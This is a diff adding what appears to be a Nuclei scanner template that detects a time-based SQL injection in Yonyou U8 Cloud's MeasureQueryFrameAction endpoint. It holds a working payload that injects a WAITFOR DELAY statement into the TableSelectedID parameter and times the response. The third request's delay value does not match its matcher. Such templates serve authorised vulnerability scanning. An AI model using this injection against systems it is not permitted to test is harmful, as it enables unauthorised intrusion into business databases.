@@ -1,0 +1,45 @@
+id: yonyou-nc-measurequeryframeaction-sqli
+info:
+  name: 用友 U8 Cloud - SQL 注入漏洞
+  author: secking
+  severity: high
+  reference:
+    - https://security.yonyou.com/#/patchInfo?identifier=5eb402abcec648f8afe964d423491c4e
+  metadata:
+    verified: true
+    max-request: 3
+    vuln-id: CT-1375054
+    vendor: yonyou
+    product: u8cloud
+  tags: sqli,vuln,yonyou,u8cloud
+variables:
+  sleepSecond1: '{{rand_int(6, 8)}}'
+  sleepSecond2: '{{rand_int(3, 5)}}'
+flow: http(1) && http(2) && http(3)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR%20DELAY%20%270:0:0%27--'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "系统正在处理请求")'
+  - max-redirects: 0
+    method: GET
+    path:
+      - '{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR%20DELAY%20%270:0:{{sleepSecond1}}%27--'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && duration * 1000 - r0latency >= sleepSecond1 * 1000 - 1000'
+  - max-redirects: 0
+    method: GET
+    path:
+      - '{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR%20DELAY%20%270:0:{{sleepSecond1}}%27--'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && duration * 1000 - r0latency >= sleepSecond2 * 1000 - 1000'
